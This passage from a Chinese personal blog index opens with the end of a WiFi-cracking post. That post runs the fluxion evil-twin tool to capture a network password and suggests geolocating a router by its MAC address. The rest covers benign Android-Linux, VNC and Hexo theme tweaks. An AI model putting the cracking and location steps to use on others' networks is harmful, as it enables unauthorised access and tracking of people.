./fluxion.sh</p></blockquote><p>按照提示进行使用，可参考[sevge博客]的fluxion一文，其实在项目的网站说明了需要使用<code>外置的usb网卡</code>我一开始是使用的内置无线网卡，使用程序一直<strong>卡在创建AP</strong>处。后来请教sevge大佬，解决了这个问题</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我使用的V3.10存在不管密码是否正确，程序都会结束wifi干扰</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>获得正确的密码<br><img src="https://s2.ax1x.com/2019/02/16/ksELZt.png" alt="ksELZt.png"></p><h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>使用路由器mac地址来定位地址，<a href="https://www.opengps.cn/Data/WIFI/Search.aspx" rel="external nofollow" target="_blank">查询网站</a>。测试效果精确</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/brannondorsey/wifi-cracking" rel="external nofollow" target="_blank">Wifi小结-github</a></p><p><a href="http://www.jianshu.com/p/ce2433d0a0d3" rel="external nofollow" target="_blank">关于定位的文章</a></p><p><a href="https://www.jianshu.com/p/04e258635466?from=timeline&amp;isappinstalled=0" rel="external nofollow" target="_blank">fluxion使用文章</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机安装kali(2)</title>
      <link href="/1b6bcf27.html"/>
      <url>/1b6bcf27.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用VNC"><a href="#使用VNC" class="headerlink" title="使用VNC"></a><strong><em>使用VNC</em></strong></h1><p>前面已经安装好了kali，接下来是看看图形化界面了。</p><h1 id="安卓手机"><a href="#安卓手机" class="headerlink" title="安卓手机"></a>安卓手机</h1><p>由于我的安卓版本比较低，使用不了网上博文中提供VNC viewer,安卓4.4+使用的<a href="https://www.realvnc.com/en/connect/download/viewer/android/" rel="external nofollow" target="_blank">VNC viewer</a>,该地址还提供其他系统的版本<br>我的垃圾手机是没有这个福利了，只好找其他替代软件了，经过几番查找找到了一个<a href="https://android-vnc-viewer.en.softonic.com/android/download" rel="external nofollow" target="_blank">140多k的软件</a></p><h1 id="kali电脑"><a href="#kali电脑" class="headerlink" title="kali电脑"></a>kali电脑</h1><p>下载VNC viewer</p><blockquote><p>apt-get install tigervnc-viewer </p></blockquote><p>运行</p><blockquote><p>viewer</p></blockquote><h1 id="安装中文库"><a href="#安装中文库" class="headerlink" title="安装中文库"></a>安装中文库</h1><p>使用ssh连接手机后root执行下面的命令</p><blockquote><p>apt-get install xfonts-intl-chinese</p></blockquote><blockquote><p>apt-get install ttf-wqy-microhei</p></blockquote><h1 id="启动VNC服务端"><a href="#启动VNC服务端" class="headerlink" title="启动VNC服务端"></a>启动VNC服务端</h1><p>执行命令</p><blockquote><p>vncserver</p></blockquote><p>返回结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New &apos;X&apos; desktop is localhost:1</span><br><span class="line">Starting applications specified in /home/android/.vnc/xstartup</span><br><span class="line">Log file is /home/android/.vnc/localhost:1.log</span><br></pre></td></tr></table></figure></p><p>证明vncserver已启动成功<br>因为刚刚终端返回的信息:<strong><em>New ‘X’ desktop is localhost:1</em></strong>指定了此次桌面会话号为<strong>1</strong>，所以端口就为<strong>5900+1=5901</strong>。如果我们开启了多个虚拟桌面，它们的会话号为2,3,4…，那么各自的端口即为5902,5903,5904…依次类推。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>停止Linux系统再启动Linux系统后，再次执行vncserver命令会出现报错<br><a href="https://imgchr.com/i/kB3jHJ" rel="external nofollow" target="_blank"><img src="https://s2.ax1x.com/2019/02/14/kB3jHJ.png" alt="kB3jHJ.png"></a><br>解决办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /tmp/.X[1-9]-lock</span><br><span class="line">rm -rf /tmp/.X11-unix/X[1-9]</span><br></pre></td></tr></table></figure></p><h2 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h2><p>vncserver默认的分辨率是1024×768<br>手机屏幕的分辨率都是720P(1280×720)，1080P(1920×1080)，甚至2K(2560×1440)<br>启动vncserver时，执行：</p><blockquote><p> vncserver -geometry 1280x720</p></blockquote><ul><li>命令中的1280x720里的x是小写字母x</li></ul><p>自动更改分辨率</p><blockquote><p>vim ~/.bashrc #编辑~/.bashrc<br>alias vncserver=’vncserver -geometry 1280x720’ </p></blockquote><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mlapp.cn/337.html" rel="external nofollow" target="_blank">美丽应用</a><br><a href="www.360doc.com/content/18/1123/02/40461272_796637204.shtml">安装vncserver</a></p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机安装kali</title>
      <link href="/40e72a3d.html"/>
      <url>/40e72a3d.html</url>
      
        <content type="html"><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>安装好了前面<strong><em>ubuntu</em></strong>那篇文章中的三个软件</p><h1 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h1><p>我使用的是中科大的源</p><blockquote><p><a href="http://mirrors.ustc.edu.cn/kali/" rel="external nofollow" target="_blank">http://mirrors.ustc.edu.cn/kali/</a></p></blockquote><p>源的格式</p><ul><li>中科大 - <a href="http://mirrors.ustc.edu.cn/+Linux&#39;s" rel="external nofollow" target="_blank">http://mirrors.ustc.edu.cn/+Linux&#39;s</a> Name/</li><li>阿里云 - <a href="http://mirrors.aliyun.com/+Linux&#39;s" rel="external nofollow" target="_blank">http://mirrors.aliyun.com/+Linux&#39;s</a> Name/</li></ul><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>获取管理员权限sudo出现问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo: PERM_ROOT: setresuid(0, -1, -1): 权限不够</span><br><span class="line">sudo: 无法初始化策略插件</span><br></pre></td></tr></table></figure></p><p>相关问题，参考文章-<a href="https://github.com/meefik/linuxdeploy/issues/224" rel="external nofollow" target="_blank">github地址</a><br>网传解决方法是把用户名设为root然后再重新配置，这个方法没有解决我的问题，还导致我不能登录设备</p><ul><li>最后我先用普通用户ssh登录，然后su，默认密码是toor。这样也能获取管理员权限<br><img src="https://s2.ax1x.com/2019/02/14/kBC7Sx.png" alt="kBC7Sx.png"></li></ul><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://www.freebuf.com/articles/terminal/13209.html" rel="external nofollow" target="_blank">基础文章</a><br><a href="https://blog.csdn.net/notzuonotdied/article/details/53933076" rel="external nofollow" target="_blank">进阶文章</a></p><blockquote><p><a href="https://mlapp.cn/134.html" rel="external nofollow" target="_blank">可继续学习博客</a></p></blockquote><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>之前在学校捣腾了一下午，失败告终，今日再度从0开始学习总算成功了。</p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机安装ubuntu</title>
      <link href="/cd94fd9a.html"/>
      <url>/cd94fd9a.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>一台安卓4.2的手机</p><blockquote><p>将手机ROOT，ROOT工具一键ROOT <a href="root.360.cn/#firstPage">ROOT工具下载</a></p></blockquote><p>一台电脑</p><h1 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h1><p>Linux系统支撑软件:<a href="https://github.com/meefik/linuxdeploy/releases" rel="external nofollow" target="_blank">Linux deploy</a></p><p>Linux deploy支撑软件:<a href="https://github.com/meefik/busybox/releases" rel="external nofollow" target="_blank">Busy Box</a></p><p>手机端SSH连接软件:<a href="https://github.com/connectbot/connectbot/releases" rel="external nofollow" target="_blank">ConnectBox</a></p><blockquote><p>我参考了一篇17年的安卓4.1文章，为保险起见我安装的是17年的Linux deploy</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="首先安装的是Busy-Box"><a href="#首先安装的是Busy-Box" class="headerlink" title="首先安装的是Busy Box"></a>首先安装的是Busy Box</h2><ul><li><p>Busy Box默认界面语言是英文，可以改成中文，点击右上角部分，在弹出的菜单中选择Settings，接着进入设置界面，找到Language项，点击后选择简体中文</p></li><li><p>点击安装，等待程序自行运行，在界面中输出## END后退出程序</p></li></ul><h2 id="安装运行Linux-deploy"><a href="#安装运行Linux-deploy" class="headerlink" title="安装运行Linux deploy"></a>安装运行Linux deploy</h2><ul><li>点击<strong><em>左上角</em></strong>选择设置找到PATH变量，赋予其值 /system/xbin 这里的路径是Busy Box的安装路径</li><li>先移除环境再更新环境</li><li>选择锁定WIFI 防止下载掉线</li><li>退回主界面，点击<strong><em>右下角</em></strong>部分,文中没有的为默认的，配置如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">属性:linux</span><br><span class="line">Containerization method (chroot)</span><br><span class="line">发行版（Ubuntu）</span><br><span class="line">架构（armhf）</span><br><span class="line">发行版版本（xenial）</span><br><span class="line">源地址 （http://mirrors.ustc.edu.cn/ubuntu-ports）</span><br><span class="line">安装类型（文件）</span><br><span class="line">安装路径（$&#123;ENV_DIR&#125;/linux.img）</span><br><span class="line">本地化（zh_CN.UTF-8）</span><br></pre></td></tr></table></figure><ul><li>安装路径是Linux系统的安装路径，如要安装在手机自带的存储空间中，则在路径开头加上${ENV_DIR}，这代表的是存储空间根目录。如要安装在sdcard中，则加上${EXTERNAL_STORAGE}。</li><li>用户名和密码自定义，本地、远程连接该系统用。</li></ul><blockquote><p>INIT 选择Enable</p></blockquote><blockquote><p>MOUNTS 选择Enable (挂载功能可让Linux系统访问手机上的文件<br>挂载列表中添加访问手机内容的目录，/sdcard:sdcard为手机自带存储空间根目录，/storage/sdcard1为sd卡根目录。)</p></blockquote><blockquote><p>SSH 选择Enable</p></blockquote><blockquote><p>图形界面 选择Enable (桌面环境选择Xfce)</p></blockquote><ul><li>退出系统设置界面，点击主界面右上角，选择安装。&lt;&lt;&lt;deploy则安装完毕。没有报错则安装成功。注意：安装完毕后要<strong><em>先点击停止按钮，再按启动按钮</em></strong></li></ul><h2 id="安装ConnectBot"><a href="#安装ConnectBot" class="headerlink" title="安装ConnectBot"></a>安装ConnectBot</h2><ul><li>点击右上角 +号创建 </li><li>输入用户名，主机输入localhost</li><li>点击右上角 +号保存信息，主界面会多出来添加的选项，点击进行SSH连接 </li></ul><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><strong><em>ss连接上后</em></strong><img src="https://s2.ax1x.com/2019/02/13/k0hRl6.png" alt="k0hRl6.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整个安装过程不太顺利，需要多次调试。强烈推荐中科大的源安装速度快好用得很</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/weixin_38235758/article/details/79219050" rel="external nofollow" target="_blank">首先参考文章</a><br><a href="https://www.linuxidc.com/Linux/2017-05/144274.htm" rel="external nofollow" target="_blank">图形化界面操作文章</a><br><a href="mirrors.ustc.edu.cn">中科大源</a></p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 玩手机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加页面标题欺骗</title>
      <link href="/fceb063.html"/>
      <url>/fceb063.html</url>
      
        <content type="html"><![CDATA[<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>离开网页，标题出现一行文字<br>重新回到网页，标题又显示另一行文字</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>在next\source\js\src文件夹下创建crash_cheat.js，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--崩溃欺骗--&gt;</span><br><span class="line"> var OriginTitle = document.title;</span><br><span class="line"> var titleTime;</span><br><span class="line"> document.addEventListener(&apos;visibilitychange&apos;, function () &#123;</span><br><span class="line">     if (document.hidden) &#123;</span><br><span class="line">         $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;);</span><br><span class="line">         document.title = &apos;页面崩溃点击恢复&apos;;</span><br><span class="line">         clearTimeout(titleTime);</span><br><span class="line">     &#125;</span><br><span class="line">     else &#123;</span><br><span class="line">         $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;);</span><br><span class="line">         document.title = &apos;页面修复成功&apos; ;</span><br><span class="line">         titleTime = setTimeout(function () &#123;</span><br><span class="line">             document.title = OriginTitle;</span><br><span class="line">         &#125;, 2000);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></p><h1 id="引用代码"><a href="#引用代码" class="headerlink" title="引用代码"></a>引用代码</h1><p>在next\layout_layout.swig文件中，添加引用（注：在/body前即可）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--崩溃欺骗--&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/crash_cheat.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/" rel="external nofollow" target="_blank">asdfv1929的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>next主题添加音乐播放器</title>
      <link href="/256e25d5.html"/>
      <url>/256e25d5.html</url>
      
        <content type="html"><![CDATA[<h1 id="添加APlayer播放器"><a href="#添加APlayer播放器" class="headerlink" title="添加APlayer播放器"></a>添加APlayer播放器</h1><h2 id="原由"><a href="#原由" class="headerlink" title="原由"></a>原由</h2><p>之前把播放器嵌在站点概览里，在手机端显示不了导致不能停止音乐</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/MoePlayer/APlayer" rel="external nofollow" target="_blank">项目地址</a>下载解压后将<strong><em>dist</em></strong>文件夹复制到themes\next\source文件夹下</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在<code>themes\next\source\dist</code>文件夹下创建music.js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">const ap = new APlayer(&#123;</span><br><span class="line">    container: document.getElementById(&apos;aplayer&apos;),</span><br><span class="line">    fixed: true,   //吸底模式</span><br><span class="line">    autoplay: true, //自动播放</span><br><span class="line">    theme: &apos;#FADFA3&apos;, //主题色</span><br><span class="line">    loop: &apos;all&apos;, //音频循环播放, 可选值: &apos;all&apos;全部循环, &apos;one&apos;单曲循环, &apos;none&apos;不循环</span><br><span class="line">    order: &apos;random&apos;, //音频循环顺序, 可选值: &apos;list&apos;列表循环, &apos;random&apos;随机循环</span><br><span class="line">    preload: &apos;auto&apos;, //预加载，可选值: &apos;none&apos;, &apos;metadata&apos;, &apos;auto&apos;</span><br><span class="line">    volume: 0.7, //默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span><br><span class="line">    mutex: true, //互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器</span><br><span class="line">    listFolded: false, //列表默认折叠</span><br><span class="line">    listMaxHeight: 90, //列表最大高度</span><br><span class="line">    lrcType: 0, //歌词传递方式</span><br><span class="line">    audio: [</span><br><span class="line">&#123;</span><br><span class="line">        name: &quot;思念是一种病&quot;,</span><br><span class="line">        artist: &apos;张震岳 / 蔡健雅&apos;,</span><br><span class="line">        url: &apos;http://www.ytmp3.cn/down/50020.mp3&apos;,</span><br><span class="line">        cover: &apos;http://p2.music.126.net/N61oLy0iLfEkZTHD2j87iA==/18693896697392706.jpg?param=130y130&apos;,</span><br><span class="line">      &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">        name: &quot;这就是爱情&quot;,</span><br><span class="line">        artist: &apos;李代沫&apos;,</span><br><span class="line">        url: &apos;http://www.ytmp3.cn/down/54477.mp3&apos;,</span><br><span class="line">        cover: &apos;http://p1.music.126.net/RQBF9kqZb7PtLCaOxi9ngQ==/109951163053984533.jpg?param=130y130&apos;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>源码中的参数可以参考<a href="https://aplayer.js.org/#/zh-Hans/" rel="external nofollow" target="_blank">官方文档</a></p><ul><li>audio对应的便是音频文件，在里面添加音乐</li></ul><p>音乐的外链可以去下面的网站搜索复制<br>音乐图片我是在网易云里搜索同一首歌曲找到的</p><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>打开<code>themes\next\layout\_layout.swig</code>文件，将下述程序添加添加到&lt; body itemscope … &gt;后面就行，即在&lt; body &gt;&lt; /body &gt;里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;/dist/APlayer.min.css&quot;&gt;</span><br><span class="line">&lt;div id=&quot;aplayer&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/music.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><hr><h1 id="音乐外链"><a href="#音乐外链" class="headerlink" title="音乐外链"></a>音乐外链</h1><p>音乐网站1:<code>www.170hi.com</code></p><p><strong>网易云</strong><br>打开网易云音乐，找到歌曲，复制网址的ID<br>比如：<code>https://music.163.com/#/song?id=xxxx，</code>id为<code>xxxx</code>，然后很简单把id放入下面的链接中<br><code>http://music.163.com/song/media/outer/url?id=ID数字.mp3</code><br>结果就是这样<code>http://music.163.com/song/media/outer/url?id=xxxx.mp3</code></p><p><a href="https://hao.su/mp3.html" rel="external nofollow" target="_blank">参考文章</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo代码复制</title>
      <link href="/2aa451b7.html"/>
      <url>/2aa451b7.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-next添加代码块复制功能"><a href="#hexo-next添加代码块复制功能" class="headerlink" title="hexo-next添加代码块复制功能"></a>hexo-next添加代码块复制功能</h1><h2 id="clipboard-js"><a href="#clipboard-js" class="headerlink" title="clipboard.js"></a>clipboard.js</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/zenorocha/clipboard.js" rel="external nofollow" target="_blank">项目地址</a>详细内容可以前往查看，如是只需实现功能即可<a href="https://raw.githubusercontent.com/zenorocha/clipboard.js/master/dist/clipboard.min.js" rel="external nofollow" target="_blank">右键下载</a>。<br>将clipboard.js保存到theme/next/source/js/src下</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在theme/next/source/js/src下创建clipboard-use.js文件代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*页面载入完成后，创建复制按钮*/</span><br><span class="line">!function (e, t, a) &#123; </span><br><span class="line">  /* code */</span><br><span class="line">  var initCopyCode = function()&#123;</span><br><span class="line">    var copyHtml = &apos;&apos;;</span><br><span class="line">    copyHtml += &apos;&lt;button class=&quot;btn-copy&quot; data-clipboard-snippet=&quot;&quot;&gt;&apos;;</span><br><span class="line">    copyHtml += &apos;&lt;span&gt;复制&lt;/span&gt;&apos;;</span><br><span class="line">    copyHtml += &apos;&lt;/button&gt;&apos;;</span><br><span class="line">    $(&quot;.highlight .code pre&quot;).before(copyHtml);</span><br><span class="line">    new ClipboardJS(&apos;.btn-copy&apos;, &#123;</span><br><span class="line">        target: function(trigger) &#123;</span><br><span class="line">            return trigger.nextElementSibling;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  initCopyCode();</span><br><span class="line">&#125;(window, document);</span><br></pre></td></tr></table></figure><p>在theme/next/source/css/_custom/custom.styl样式中添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//代码块复制按钮</span><br><span class="line">.highlight&#123;</span><br><span class="line">  //方便copy代码按钮（btn-copy）的定位</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.btn-copy &#123;</span><br><span class="line">    display: inline-block;</span><br><span class="line">    cursor: pointer;</span><br><span class="line">    background-color: #eee;</span><br><span class="line">    background-image: linear-gradient(#fcfcfc,#eee);</span><br><span class="line">    border: 1px solid #d5d5d5;</span><br><span class="line">    border-radius: 3px;</span><br><span class="line">    -webkit-user-select: none;</span><br><span class="line">    -moz-user-select: none;</span><br><span class="line">    -ms-user-select: none;</span><br><span class="line">    user-select: none;</span><br><span class="line">    -webkit-appearance: none;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    font-weight: 700;</span><br><span class="line">    line-height: 20px;</span><br><span class="line">    color: #333;</span><br><span class="line">    -webkit-transition: opacity .3s ease-in-out;</span><br><span class="line">    -o-transition: opacity .3s ease-in-out;</span><br><span class="line">    transition: opacity .3s ease-in-out;</span><br><span class="line">    padding: 2px 6px;</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 5px;</span><br><span class="line">    top: 5px;</span><br><span class="line">    opacity: 0;</span><br><span class="line">&#125;</span><br><span class="line">.btn-copy span &#123;</span><br><span class="line">    margin-left: 5px;</span><br><span class="line">&#125;</span><br><span class="line">.highlight:hover .btn-copy&#123;</span><br><span class="line">  opacity: 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在themes/next/layout/_layout.swig文件中引用（/body）之前添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 代码块复制功能 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard.js&quot;&gt;&lt;/script&gt;  </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard-use.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali软件小技巧</title>
      <link href="/8ff35b13.html"/>
      <url>/8ff35b13.html</url>
      
        <content type="html"><![CDATA[<hr><h1 id="kali应用总结"><a href="#kali应用总结" class="headerlink" title="kali应用总结"></a>kali应用总结</h1><h2 id="卸载软件删除配置"><a href="#卸载软件删除配置" class="headerlink" title="卸载软件删除配置"></a>卸载软件删除配置</h2><blockquote><p>apt-get purge XXXX</p></blockquote><h2 id="安装截图软件"><a href="#安装截图软件" class="headerlink" title="安装截图软件"></a>安装截图软件</h2><h3 id="下载安装python-xlib"><a href="#下载安装python-xlib" class="headerlink" title="下载安装python-xlib"></a>下载安装python-xlib</h3><blockquote><p>apt-get install python-xlib</p></blockquote><h3 id="下载安装截图软件包"><a href="#下载安装截图软件包" class="headerlink" title="下载安装截图软件包"></a>下载安装截图软件包</h3><blockquote><p>wget <a href="http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb" rel="external nofollow" target="_blank">http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb</a></p></blockquote><h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><blockquote><p>dpkg -i deepin-scrot*</p></blockquote><p>运气比较好，安装没有报错。据说如果报错啥的可能需要安装依赖，可以通过强制执行安装依赖命令解决问题</p><p><strong><em>报错了参考下面的方法</em></strong></p><h3 id="强制安装依赖包"><a href="#强制安装依赖包" class="headerlink" title="强制安装依赖包"></a>强制安装依赖包</h3><blockquote><p>apt-get -f install</p></blockquote><h3 id="重新安装截图软件包"><a href="#重新安装截图软件包" class="headerlink" title="重新安装截图软件包"></a>重新安装截图软件包</h3><blockquote><p>sudo dpkg -i deepin-scrot*</p></blockquote><p>如果顺利的话 此时应该执行deepin-scrot就可截图了</p><h3 id="设置快捷键"><a href="#设置快捷键" class="headerlink" title="设置快捷键"></a>设置快捷键</h3><p>在设置页面自定义快捷件，由于用QQ截图习惯了，我设置的Ctrl+Alt+A</p><p><a href="https://imgchr.com/i/k1YJIJ" rel="external nofollow" target="_blank"><img src="https://s2.ax1x.com/2019/01/31/k1YJIJ.md.png" alt="k1YJIJ.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-admin插件</title>
      <link href="/3e163297.html"/>
      <url>/3e163297.html</url>
      
